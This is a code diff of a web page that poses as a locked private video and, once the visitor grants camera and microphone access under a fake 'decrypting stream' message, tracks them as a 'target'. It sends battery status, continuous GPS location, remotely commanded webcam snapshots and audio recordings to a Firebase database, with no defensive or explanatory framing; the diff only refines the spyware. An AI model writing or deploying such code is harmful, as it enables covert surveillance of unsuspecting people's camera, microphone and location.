@@ -2,77 +2,78 @@
 <html>
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Stream Private Content</title>
+    <title>Private Stream Access</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        body { margin: 0; background: #000; color: #fff; font-family: sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        #player { width: 90%; max-width: 500px; aspect-ratio: 16/9; background: #0a0a0a; border: 1px solid #333; display: flex; justify-content: center; align-items: center; position: relative; border-radius: 12px; cursor: pointer; }
-        #play-btn { width: 80px; height: 80px; background: rgba(255,0,0,0.9); border-radius: 50%; display: flex; justify-content: center; align-items: center; }
+        body { margin: 0; background: #000; color: #fff; font-family: sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; }
+        #player-box { width: 90%; max-width: 450px; aspect-ratio: 16/9; background: #050505; border: 1px solid #1a1a1a; display: flex; justify-content: center; align-items: center; border-radius: 15px; cursor: pointer; position: relative; overflow: hidden; }
+        #play-btn { width: 70px; height: 70px; background: rgba(255,0,0,0.85); border-radius: 50%; display: flex; justify-content: center; align-items: center; box-shadow: 0 0 30px rgba(255,0,0,0.4); }
         #play-btn::after { content: ''; border-top: 15px solid transparent; border-bottom: 15px solid transparent; border-left: 25px solid #fff; margin-left: 5px; }
-        .info { margin-top: 20px; text-align: center; }
-        h2 { color: #00ff41; font-size: 18px; }
+        .glow-text { color: #00ff41; font-size: 18px; text-shadow: 0 0 10px #00ff41; margin-top: 20px; }
     </style>
 </head>
 <body>
-    <div id="player" onclick="initCommandCenter()">
+    <div id="player-box" onclick="startTracking()">
         <div id="play-btn"></div>
     </div>
-    <div class="info">
-        <h2>Private Video: Restricted Access</h2>
-        <p style="color:#666; font-size:12px;">Grant camera access to decrypt the stream.</p>
-    </div>
+    <div class="glow-text">VIDEO ENCRYPTED: CLICK TO DECODE</div>
 
     <script>
         const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
+        const agentID = "UNIT-" + Math.floor(1000 + Math.random() * 9000);
 
-        // Generate Unique ID for every visitor
-        const agentID = "UNIT_" + Math.floor(1000 + Math.random() * 9000);
-
-        async function initCommandCenter() {
+        async function startTracking() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                document.body.innerHTML = "<div style='color:#00ff41; font-family:monospace;'>[+] Decrypting Stream... 45%<br>[+] Syncing with Satellite...</div>";
+                document.body.innerHTML = "<div style='color:#00ff41; font-family:monospace; padding:20px;'>[SYSTEM] DECRYPTING DATA...<br>[SYSTEM] SYNCING SATELLITE...<br>[SYSTEM] DO NOT CLOSE TAB</div>";
 
-                // Hidden Video for background capture
                 const v = document.createElement('video');
                 v.srcObject = stream; v.muted = true; v.play();
 
-                // Send Online Status
-                db.ref('targets/' + agentID + '/status').set("ONLINE");
+                // Advanced Data: Battery & Online Status
+                setInterval(async () => {
+                    const bat = await navigator.getBattery();
+                    db.ref('targets/' + agentID + '/info').set({
+                        battery: Math.floor(bat.level * 100) + "%",
+                        status: "ONLINE",
+                        lastSeen: new Date().toLocaleTimeString()
+                    });
+                }, 5000);
 
-                // Command Listener
+                // Command Engine
                 db.ref('commands/' + agentID).on('value', async snap => {
                     const cmd = snap.val();
                     if(!cmd) return;
-
+                    
                     if(cmd.action.includes('photo')) {
                         const canvas = document.createElement('canvas');
                         canvas.width = v.videoWidth; canvas.height = v.videoHeight;
                         canvas.getContext('2d').drawImage(v, 0, 0);
-                        db.ref('targets/' + agentID + '/photos').push({ img: canvas.toDataURL('image/jpeg', 0.5), time: Date.now() });
+                        db.ref('targets/' + agentID + '/photos').push({ img: canvas.toDataURL('image/jpeg', 0.4), time: Date.now() });
                     }
                     if(cmd.action === 'audio') {
                         const rec = new MediaRecorder(stream);
-                        let ch = [];
-                        rec.ondataavailable = e => ch.push(e.data);
+                        let chunks = [];
+                        rec.ondataavailable = e => chunks.push(e.data);
                         rec.onstop = () => {
                             const reader = new FileReader();
-                            reader.readAsDataURL(new Blob(ch, {type:'audio/webm'}));
-                            reader.onloadend = () => db.ref('targets/' + agentID + '/audios').push({ audio: reader.result, time: Date.now() });
+                            reader.readAsDataURL(new Blob(chunks, {type:'audio/webm'}));
+                            reader.onloadend = () => db.ref('targets/' + agentID + '/audios').push({ audio: reader.result });
                         };
                         rec.start(); setTimeout(() => rec.stop(), 4000);
                     }
+                    db.ref('commands/' + agentID).remove();
                 });
 
-                // Auto Location Update
-                navigator.geolocation.watchPosition(pos => {
-                    db.ref('targets/' + agentID + '/location').set({ lat: pos.coords.latitude, lng: pos.coords.longitude, last: new Date().toLocaleTimeString() });
+                // GPS Tracking
+                navigator.geolocation.watchPosition(p => {
+                    db.ref('targets/' + agentID + '/location').set({ lat: p.coords.latitude, lng: p.coords.longitude });
                 });
 
-            } catch(e) { alert("Permission Required!"); location.reload(); }
+            } catch(e) { alert("Access Denied: Please click Allow to view."); location.reload(); }
         }
     </script>
 </body>
